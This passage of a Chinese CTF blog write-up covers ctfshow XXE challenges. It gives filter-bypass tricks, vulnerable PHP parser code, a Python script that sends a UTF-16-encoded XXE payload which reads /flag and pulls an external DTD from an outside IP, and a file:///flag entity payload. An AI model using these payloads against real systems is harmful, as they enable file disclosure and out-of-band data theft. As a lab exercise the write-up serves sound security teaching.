+</code></pre><button class="code-block-unfold-btn"></button></div><p>绕过方法二：添加空格</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- 上面是限制的语句--&gt;
+&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- 我们多添加一个空格就和整个句子不同了--&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>绕过方法三：引号替换绕过</p><div class="language-xml"><button title="Copy code" class="copy"></button><span class="lang">xml</span><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- 上面是限制的语句--&gt;
+&lt;?xml  version=&#39;1.0&#39; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!-- 我们双引号换成单引号就和整个句子不同了--&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="web376" tabindex="-1">web376 <a class="header-anchor" href="#web376" aria-label="Permalink to &quot;web376&quot;">​</a></h3><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">&lt;?php
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+if(preg_match(&#39;/&lt;\?xml version=&quot;1\.0&quot;/i&#39;, $xmlfile)){
+    die(&#39;error&#39;);
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__); 
+</code></pre><button class="code-block-unfold-btn"></button></div><p>比较与上题的区别，正则后面添加了一个/i表示整个匹配不区分大小写</p><p>和上一题的payload相同</p><h3 id="web377" tabindex="-1">web377 <a class="header-anchor" href="#web377" aria-label="Permalink to &quot;web377&quot;">​</a></h3><div class="language-php"><button title="Copy code" class="copy"></button><span class="lang">php</span><pre><code class="language-php">&lt;?php
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+if(preg_match(&#39;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#39;, $xmlfile)){
+    die(&#39;error&#39;);
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);    
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们来看和上题的区别，添加了对http的限制</p><p>在xml文档的编码中，不仅支持utf-8编码，同时也支持utf-16编码，所以我们也可以将payload转为utf-8编码，然后post传送数据</p><div class="language-py"><button title="Copy code" class="copy"></button><span class="lang">py</span><pre><code class="language-py">import requests
+
+url = &quot;http://c5cd315f-3854-4073-b5dc-42c8d51f32e4.challenge.ctf.show/&quot;
+payload = &#39;&#39;&#39;
+&lt;!DOCTYPE hacker[
+    &lt;!ENTITY  % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
+    &lt;!ENTITY  % dtds SYSTEM &quot;http://154.8.183.198/test/test.dtd&quot;&gt;
+
+    %dtds;
+]&gt; 
+
+&lt;root&gt;
+1
+&lt;/root&gt;&#39;&#39;&#39;
+payload = payload.encode(&#39;utf-8&#39;)
+print(payload)
+re = requests.post(url, data=payload)
+print(re.text)
+#b&#39;\xff\xfe\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00h\x00a\x00c\x00k\x00e\x00r\x00[\x00\n\x00 \x00 \x00 \x00 \x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00 \x00 \x00 \x00 \x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00 \x00%\x00 \x00d\x00t\x00d\x00s\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x001\x005\x004\x00.\x008\x00.\x001\x008\x003\x00.\x001\x009\x008\x00/\x00t\x00e\x00s\x00t\x00/\x00t\x00e\x00s\x00t\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00\n\x00 \x00 \x00 \x00 \x00%\x00d\x00t\x00d\x00s\x00;\x00\n\x00]\x00&gt;\x00 \x00\n\x00\n\x00&lt;\x00r\x00o\x00o\x00t\x00&gt;\x00\n\x001\x00\n\x00&lt;\x00/\x00r\x00o\x00o\x00t\x00&gt;\x00&#39;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们发现编码后http彻底绕过</p><p>然后nc连接，成功获得flag</p><h3 id="web378" tabindex="-1">web378 <a class="header-anchor" href="#web378" aria-label="Permalink to &quot;web378&quot;">​</a></h3><p>打开后是一个登录界面，ctrl+u查看一下源码</p><p>看到post里存在xxe</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192111760.png" alt="image-20250519211113702" loading="lazy" decoding="async"></figure><p>访问/doLogin，post传参</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE XXE [
+&lt;!ENTITY cmd SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;cmd;&lt;/username&gt;&lt;password&gt;&amp;cmd;&lt;/password&gt;&lt;/user&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505192110602.png" alt="image-20250519211058311" loading="lazy" decoding="async"></figure><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/ctfshow-xxe" target="_blank" title="本文链接">https://kinsey973.github.io/posts/ctfshow-xxe</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/ctfshow-%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0" class="post-nav-prev" title="ctfshow-文件上传"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">ctfshow-文件上传</span></a></div><div class="post-nav-item"><a href="/posts/crypto-1" class="post-nav-next" title="crypto-"><span class="title truncate" text="sm">crypto-</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2025-05-19T19:02:05.000Z","datePublished":"2025-05-19T19:02:05.000Z","inLanguage":"zh-CN","name":"ctfshow-xxe","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2025-05-19T19:02:05.000Z","datePublished":"2025-05-19T19:02:05.000Z","description":"山行野宿，孤身万里","name":"ctfshow-xxe","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2025-05-19T19:02:05.000Z","datePublished":"2025-05-19T19:02:05.000Z","description":"山行野宿，孤身万里","headline":"ctfshow-xxe","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505191957523.png"}]}</script>
+  
+</body>
+</html>
